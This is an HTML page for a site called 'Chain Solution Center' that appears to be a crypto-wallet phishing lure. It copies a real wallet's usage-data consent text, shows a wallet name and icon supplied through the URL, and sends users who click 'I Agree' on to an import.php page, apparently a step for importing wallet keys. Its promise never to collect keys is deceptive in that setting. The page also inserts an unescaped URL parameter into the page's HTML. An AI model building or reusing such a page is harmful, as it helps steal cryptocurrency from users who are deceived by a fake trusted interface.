<!DOCTYPE HTML>
<html>
<head>
    <title>Chain Solution Center</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
    <link rel="stylesheet" href="src_assets/css/main.css" />
    <link rel="icon" href="images/favicon.png" type="image/x-icon">
    <meta name="robots" content="noindex, nofollow" />
    <noscript><link rel="stylesheet" href="src_assets/css/noscript.css" /></noscript>
    <script defer src="src_assets/js/lcw-widget.js" type="2a8efe072b599ee7179a4279-text/javascript"></script>
    <link rel="stylesheet" href="./cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />

    <style>
        .conn{
            display: flex; /* Use flexbox to center the content */
            justify-content: center; /* Center horizontally */
            align-items: center;
        }
        .container {
            background-color: #2e3141;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 90%;
            max-width: 700px;
        }

        .headerX {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 1px solid #e0e0e0;
            padding-bottom: 15px;
        }

        .headerX img {
            width: 50px;
            height: 50px;
            border-radius: 10px;
        }

        .headerX .wallet-name {
            font-size: 1.5em;
            font-weight: bold;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            max-width: 80%;
        }
        .buttons button {
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            font-size: 16px;
        }

        .buttons .agree-button {
            background-color: #28a745;
            color: #fff;
        }

        .buttons .agree-button:hover {
            background-color: #218838;
        }

        .buttons .no-thanks-button {
            background-color: #dc3545;
            color: #fff;
        }

        .buttons .no-thanks-button:hover {
            background-color: #c82333;
        }
        @media (max-width: 768px) {
            .buttons button {
                padding:5px;}
        }
        @media (max-width: 480px) {
            .buttons button {
                padding:5px;}
        }
    </style>
</head>
<body class="is-preload">
<!-- Page Wrapper -->
<div id="page-wrapper">
    <!-- Header -->
    <header id="header" class="alt">
        <div class="livecoinwatch-widget-5" lcw-base="USD" lcw-color-tx="#999999" lcw-marquee-1="coins" lcw-marquee-2="movers" lcw-marquee-items="20" ></div>
        <h1><a href="/">Chain Solution Center</a></h1>
        <nav>
            <a href="#menu">Menu</a>
        </nav>
    </header>

    <!-- Menu -->
    <nav id="menu">
        <div class="inner">
            <h2>Menu</h2>
            <ul class="links">
                <li><a href="/">Home</a></li>
                <li><a href="explore.php">Explore</a></li>
                <li><a href="#">Contact</a></li>
            </ul>
            <a href="#" class="close">Close</a>
        </div>
    </nav>
    <section id="four" class="wrapper alt style1">
        <br><br>
        <div class="conn">
            <div class="container">
                <div class="headerX">
                    <img id="walletIcon" src="" alt="Wallet Icon">
                    <div id="walletName" class="wallet-name"></div>
                </div>
                <div class="body">
                    <h1>Help us improve Chain Solution Center</h1>
                    <p style="text-align:left;">Chain Solution Center would like to gather usage data to better understand how our users interact with Chain Solution Center.<br> This data will be used to provide the service, which includes improving the service based on your use.<br>
                        <b>Chain Solution Center will:</b><br>
                        âï¸ Always allow you to opt-out via Settings<br>
                        âï¸ Send anonymized click and pageview events<br>
                        â <b>Never</b> collect information we donât need to provide the service (such as keys, addresses, transaction hashes, or balances)<br>
                        â <b>Never</b> collect your full IP address*<br>
                        â <b>Never</b> sell data. Ever!<br>
                    </p>
                    <p>This data is aggregated and is therefore anonymous for the purposes of General Data Protection Regulation (EU) 2016/679.<br>
                        * When you use Infura as your default RPC provider in Chain Solution Center, Infura will collect your IP address and your Ethereum wallet address when you send a transaction. We donât store this information in a way that allows our systems to associate those two pieces of data. For more information on how Chain Solution Center and Infura interact from a data collection perspective, see our update <a href="">here</a>. For more information on our privacy practices in general, see our <a href="">Privacy Policy</a> here.</p>
                </div>
                <div class="buttons">
                    <button class="agree-button" onclick="if (!window.__cfRLUnblockHandlers) return false; redirectToImportPage()" data-cf-modified-f407ac1214edfe539670976a-="">I Agree</button>&nbsp;&nbsp;
                    <button class="no-thanks-button" onclick="if (!window.__cfRLUnblockHandlers) return false; history.back()" data-cf-modified-f407ac1214edfe539670976a-="">No Thanks</button>
                </div>
            </div>
        </div>
        <br>
        <br>
    </section>
    <section id="footer">
        <div class="inner">
            <h2 class="major">Get in touch</h2>
            <p>Connect with us by becoming a part of our Discord community.</p>

            <ul class="copyright">
                <li>&copy; 2024  Chain Solution Center. All rights reserved.</li>
            </ul>
        </div>
    </section>
</div>
<script type="text/javascript">
    // JavaScript to handle query parameters
    document.addEventListener('DOMContentLoaded', function () {
        // Function to get query parameters
        function getQueryParams() {
            const urlParams = new URLSearchParams(window.location.search);
            return {
                url: urlParams.get('url'),
                name: urlParams.get('name'),
                icon: urlParams.get('icon'),
                random: urlParams.get('random')
            };
        }

        // Get the wallet data from URL
        const walletData = getQueryParams();

        // Update the page with wallet details
        const walletIcon = document.getElementById('walletIcon');
        const walletName = document.getElementById('walletName');
        const walletUrl = document.getElementById('walletUrl');

        if (walletData.icon) {
            walletIcon.src = walletData.icon;
        }
        if (walletData.name) {
            walletName.textContent = walletData.name;
        }
        if (walletData.url) {
            walletUrl.innerHTML = `<a href="${walletData.url}" target="_blank">${walletData.url}</a>`;
        }
    });
    function redirectToImportPage() {
        const walletData = new URLSearchParams(window.location.search);
        window.location.href = `import.php?${walletData.toString()}`;
    }
</script>
<script src="src_assets/js/jquery.min.js" type="text/javascript"></script>
<script src="src_assets/js/jquery.scrollex.min.js" type="text/javascript"></script>
<script src="src_assets/js/browser.min.js" type="text/javascript"></script>
<script src="src_assets/js/breakpoints.min.js" type="text/javascript"></script>
<script src="src_assets/js/util.js" type="text/javascript"></script>
<script src="src_assets/js/main.js" type="text/javascript"></script>
<script type="text/javascript">(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8b9532342da763d7',t:'MTcyNDY4OTcxOC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/src_assets/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script src="./src_assets/cloudflare-static/rocket-loader.min.js" data-cf-settings="f407ac1214edfe539670976a-|49" defer></script></body>
</html>